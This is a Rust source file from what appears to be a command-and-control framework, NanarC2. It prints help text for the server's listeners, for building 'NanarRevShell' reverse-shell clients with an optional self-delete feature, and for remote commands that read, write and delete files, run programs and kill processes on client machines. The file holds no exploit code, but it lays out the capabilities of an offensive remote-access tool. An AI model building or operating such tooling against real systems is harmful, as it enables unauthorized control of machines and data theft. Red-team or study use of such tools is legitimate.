use colored::Colorize;
use std::io::Write;

pub const LOGO_STR: &str = r#"
                                                         _..._                   
                                                      .-'_..._''.     .-''-.     
   _..._                _..._                       .' .'      '.\  .' .-.  )    
 .'     '.            .'     '.                    / .'            / .'  / /     
.   .-.   .          .   .-.   .          .-,.--. . '             (_/   / /      
|  '   '  |    __    |  '   '  |    __    |  .-. || |                  / /       
|  |   |  | .:--.'.  |  |   |  | .:--.'.  | |  | || |                 / /        
|  |   |  |/ |   \ | |  |   |  |/ |   \ | | |  | |. '                . '         
|  |   |  |`" __ | | |  |   |  |`" __ | | | |  '-  \ '.          .  / /    _.-') 
|  |   |  | .'.''| | |  |   |  | .'.''| | | |       '. `._____.-'/.' '  _.'.-''  
|  |   |  |/ /   | |_|  |   |  |/ /   | |_| |         `-.______ //  /.-'_.'      
|  |   |  |\ \._,\ '/|  |   |  |\ \._,\ '/|_|                  `/    _.'         
'--'   '--' `--'  `" '--'   '--' `--'  `"                      ( _.-'     

         ------------------------------------------------------
        | Made By: Muhammad Muazen | github.com/MuhammadMuazen |             
         ------------------------------------------------------
"#;

fn get_exe_file_name() -> String {

    let exe_path: std::path::PathBuf = std::env::current_exe().expect("[-] Error: Failed to get current executable path");
    let exe_name: &std::ffi::OsStr = exe_path.file_name().expect("[-] Error: Failed to get executable name");
    let str_exe_name: &str = exe_name.to_str().expect("[-] Error: Failed to convert executable name to string");

    return str_exe_name.to_owned();
}

pub fn help_message() {

    let executable_name_string: String = get_exe_file_name();

    println!(r#"{0}

    [i] Usage:

        {1} [options]
    
    [i] Options:

        -h,   --help                      Prints this help message.
        -pc,  --print-clients             Prints the contents of the json file that contains all the clients IDs and its path.
        -rc,  --remove-client [ID]        Remove a client ID and information from the json file that contains all the clients IDs.
        -rac, --remove-all-clients        Delets the clients information json file.
        -pcf, --point-client-file [Path]  Make the server point to another clients json file.
        -plc, --print-local-commands      Prints all the avaliable commands that we can run once we start the server.
        -prc, --print-remote-commands     Prints all the avaliable commands that can be sent to the client.

    [i] To start the server simply run the command:

        {1}
"#, LOGO_STR.yellow(), executable_name_string.green());
}

pub fn print_local_commands() {

    println!(r#"    
[i] These commands can be run inside the server command line interface:

    [1] l, listener [options] --> Make the server listen in the background in a way specifed by the options:

        1) socket [local-ip] [local-port]
        2) http [local-ip] [local-port]
        3) https [local-ip] [local-port] [certificate-path]
        4) nanar-rev-shell [options]:
            - socket [local-ip] [local-port]
            - http local-ip] [local-port]
            - https [local-ip] [local-port] [certificate-path]

    [2] crsh, create-revshell [options] --> Compiles a new NanarRevShell with new ID and communication password and add 
        them to the clients.json file (Requires cargo to be installed on your machine):
 
        1) -s, --socket [ip/domain] [port]  Specify the socket the client will connect to.
        2) -http [ip/domain] [port]         Specify the HTTP server the client will connect to.
        3) -https [ip/domain] [port]        Specify the HTTPS server the client will connect to.     
        4) -cd, --client-directory [path]   Specify the client directory path which will be compiled.
        5) -sd, --self-delete               Add the self delete feature to the client.

    [3] ls, list-sessions --> List all the clients sessions which are connected to the server.

    [4] ll, list-listeners --> List all  the listeners which have no connections with clients yet.

    [5] s, session [Session ID/Number in the list] [options] --> Select a session and do the option:
        
        1) -i, --interact                   Open the client session shell to interact with it.
        2) -r, --remove                     Delete the client session and remove the ID from the clients.json file.
        3) -d, --details                    Prints the session's connection details
    
    [6] config [option] --> Interact with the server modifications depending on the option:

        1) -m,  --modify [config-key-name]   Modify the the value of the configuration specifed ({{ -m all }} can be used to run a dialog 
                                             to change all the configurations values in nanar_config.json file).
        2) -p,  --print                      Prints the contents of the nanar_config.json file and its path.
        3) -sp, --set-path [path]            Point to a new configuration file by setting its path.
    
    [7] h, help --> Prints this help message.

    [8] prc, print-remote-commands --> Prints all the avaliable commands that can be sent to the client.

    [9] pc, print-clients --> Prints the contents of the json file that contains all the clients IDs and its path.

    [10] clear --> Clear the terminal screen.

    [11] exit --> Exit the server (Warning: This will terminate all the clients connections with the servers).
"#);
}

pub fn print_remote_commands() {

    println!(r#"
[i] These are the commands that can be sent from the server to be executed on the client and can be run inside the client's
    interactive shell:
    
    [1]  help                            Prints this help message.
    [2]  pwd                             Print current working directory.
    [3]  ls [path]                       List the contents of the specified path.
    [4]  cd [path]                       Change the current working directory to the specified directory.
    [5]  read [file-path]                Prints the content of the specifed file.
    [6]  write ["content"] [file-path]   Write the specified content to the content of the specified file.
    [8]  rf [file-path]                  Remove file specified by the file path.
    [9]  rd [dir-path]                   Remove directory specified by the directory path.
    [10] mdir [path]                     Make a directory in the specified path.
    [11] cp [src-path] [dest-path]       Copy a file/directory from the source path to the destination path.
    [12] mv [src-path] [dest-path]       Move a file/directory from the source path to the destination path.
    [13] exec [exe-name] [exe-args]      Run an executable specified by the executable name.
    [14] ps [options]                    Print the current runnning processes in the system (no options it prints the process name and ID). 
            1) -pid                      Process ID.
            2) -u                        Process user.
            3) -p                        Process executable path.
            4) -arch                     Process architecture.
            5) -m                        Process memory usage.
            6) -ppid                     Process parent ID.
            7) -sid                      Process SID.
    [15] pk [process-id]                  Kill process by providing its ID.
    [16] terminate [-f]                   Terminate the connection between the client and the server without making the client 
                                         process stop on the client machine unless we provide the option {{ -f }}.                   
"#);
}

pub fn clear_screen() {
    
    print!("{esc}[2J{esc}[1;1H", esc = 27 as char);
    std::io::stdout().flush().unwrap();
}